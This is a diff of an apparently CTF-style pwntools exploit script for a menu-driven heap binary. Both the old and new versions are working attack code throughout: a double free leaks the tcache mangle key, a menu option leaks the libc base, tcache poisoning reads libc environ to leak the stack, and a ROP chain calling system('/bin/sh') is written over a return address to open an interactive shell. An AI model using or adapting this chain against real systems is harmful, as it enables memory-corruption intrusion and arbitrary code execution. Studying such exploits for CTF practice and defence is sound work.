@@ -6,7 +6,7 @@ context.update(
         endian="little",
         log_level="info",
         os="linux",
-        terminal=["xfce4-terminal", "-e"]
+        terminal=["alacritty", "-e"]
 )
 
 to = 2
@@ -35,146 +35,93 @@ def start(binary):
     else:
         return process(binary)
 
-def create(p, idx, value):
-    ru(p,b"choice >>>")
+def create(p, index, value):
+    ru(p,b"Enter your choice >>>")
     sl(p,b"2")
-    ru(p,b"(1-6) >>> ")
-    sl(p, f"{idx}".encode())
+    ru(p,b"Select a pocket to place an item in (1-6) >>> ")    
+    sl(p,b"%i" % index)
     ru(p,b"name >>>")
     sl(p,value)
-    #ru(p, b">>>")
-   
-def delete(p, index):
-    ru(p,b"choice >>>")
-    sl(p,b"3")
-    sl(p,"%i" % index)
-    ru(p, b">>>")
 
 def use(p, index):
-    ru(p,b"choice >>>")
+    ru(p,b"Enter your choice >>>")
     sl(p,b"1")
-    ru(p,b"(1-6) >>> ")
+    ru(p,b"Use item from which pocket (1-6) >>>")
     sl(p,"%i" % index)
-    ru(p,b"<<<")
-    ru(p, b": ")
-    ret = rl(p)
+    ru(p,b"Using item from pocket %d: " % index) 
 
-    return ret[:-1]
+    return rl(p).strip(b'\n')
 
-def modified_use_remote(p, index):
-    ru(p,b"choice >>>")
-    sl(p,b"1")
-    ru(p,b"(1-6) >>> ")
+def delete(p, index):
+    ru(p,b"Enter your choice >>>")
+    sl(p,b"3")
+    ru(p,b"Select a pocket to remove an item from (1-6) >>>")
     sl(p,"%i" % index)
-    ru(p, b": ")
-    #ru(p,b"<<<")
-    #ru(p, b": ")
-    #rl(p)
-    ret = ru(p, b"<<<")
+
+def generate_rop_chain(l):
+    r = ROP(l)
+
+    chain = p64(r.find_gadget(["ret"])[0]) * 2
+    chain += p64(r.find_gadget(["pop rdi", "ret"])[0])
+    chain += p64(next(l.search(b"/bin/sh\x00")))
+    chain += p64(l.sym["system"])
+
+    return chain
+
+
+def exploit(p,e,l):
     
-    return ret[24:-3]
+    delete(p,1)
+    delete(p,1)
 
-def modified_use(p, index):
-    ru(p,b"<<<")
-    ru(p,b"choice >>>")
-    sl(p,b"1")
-    ru(p, b": ")
-    sl(p,"%i" % index)
-    #ru(p,b"<<<")
-    #ru(p, b": ")
-    rl(p)
-    ret = rl(p)
+    tcache_mangle = up(use(p,1))
+    heap_leak = tcache_mangle << 12
+    log.info(f"Leaked tcache mangle key {hex(tcache_mangle)}")
+    log.info(f"Leaked heap {hex(heap_leak)}")
     
-    return ret
+    create(p,5,b"Genie")
+    use(p,5)
 
-def leak(io):
-    create(io, 5, b"Genie") 
-    sl(p,b"1")
-    sl(p,"%i" % 5)
-    ru(p,b"<<<")
-    ru(p, b": ")
-    ret = rl(p)
-    p.recvuntil(b'<<< The genie unrolls a shimmering map showing a secret starting point: ')
-    libc = p.recvline().replace(b'\n', b'')
-    return libc
+    ru(p,b" secret starting point:")
+    l.address = int(rl(p),16) - l.sym["printf"]
+
+    log.info(f"Leaked libc base address {hex(l.address)}")
     
+    target = (l.sym["environ"] - 0x18) ^ tcache_mangle
 
-def exploit(io,e,l):
-    '''
-        PLAN:
-         - freeing twice allows for UAF
-         - get heap leak through UAF
-         - use genie for libc leak
-         - get stack leak through environ
-         - ret2libc!!
-    '''
-    delete(io, 1)
-    delete(io, 1)
-    #delete(io, 2)
-    #delete(io, 2)
+    delete(p,2)
+    delete(p,3)
+    delete(p,4)  
+    delete(p,4)
 
-    mangle = use(io, 1)
-    mangle = int.from_bytes(mangle, "little")
-    print(f"========== Mangle bytes: {hex(mangle)}")
+    create(p,4,p64(target))
+    create(p,3,b"A")
+    create(p,2,b"A"*0x17)
 
-    #heap = use(io, 2)
-    #heap = int.from_bytes(heap, "little") ^ mangle
-    #heap -= 0x2a0
-    #print(f"========== Heap leak: {hex(heap)}")
+    use(p,2)
 
-    libc = int(leak(io), 16) - l.sym["printf"]
-    print(f"========== Libc leak: {hex(libc)}")
+    stack_leak = u64(p.recv(6).ljust(8, b"\x00"))
+    log.info(f"Leaked stack from libc environ {hex(stack_leak)}")
 
-    print(f"system {hex(l.sym["system"] + libc)}")
-    # tcache poisoning to leak stack through libc environ
-    delete(io, 4)
-    delete(io, 3)
-    delete(io, 6)
-    delete(io, 6)
+    delete(p,3)
+    delete(p,6)
+    delete(p,5)
+    delete(p,5)
 
-    target = (libc + l.sym["environ"] - 0x18) ^ mangle
-    create(io, 6, p64(target))
+    target = ((stack_leak - 0x148) & 0xfffffffffffffff0) ^ tcache_mangle
 
-    create(io, 4, b"A")
-    create(io, 3, b"A"*0x17)
-    
-    modified_use(io, 3) # need this to work remotely
-    #modified_use(io, 3) # need this to work remotely
-    stack = modified_use_remote(io, 3)
-    #stack = modified_use(io, 3)
-    #print(f"========== {stack}")
-    
-    stack = int.from_bytes(stack[:-1], "little") - 0x151
-    print(f"========== Stack leak: {hex(stack)}")
+    log.info(f"Sending rop chain at {hex(target ^ tcache_mangle)}")
 
-    
-    # overwrite return pointer 
-    delete(io, 2) 
-    delete(io, 4) 
-    delete(io, 5) 
-    delete(io, 5) 
+    create(p,5,p64(target))
+
+    pause()
+    create(p,6,b"A")
+    create(p,3,generate_rop_chain(l))
  
-    #target = (stack - 8) ^ mangle
-    target = (stack - 0x140 ) ^ mangle
-    create(io, 5, p64(target))
+    for i in range(5):
+        use(p,1)
 
-    create(io, 2, b"A")
-
-    #payload = p64(0x10f75b + libc) # pop rdi ; ret
-    payload = b"A"*8 +  p64(0x10f75b + libc) # pop rdi ; ret
-    payload += p64(next(l.search("/bin/sh")) + libc)
-    payload += p64(0x2882f + libc)
-    payload += p64(l.sym["system"] + libc)
-
-    create(io, 4, payload)
-
-    #use(io, 1)
-    #use(io, 1)
-    #use(io, 1)
-    #use(io, 1)
-    #use(io, 1)
-    
-    io.interactive()
+    p.interactive()
     
 
 if __name__=="__main__":
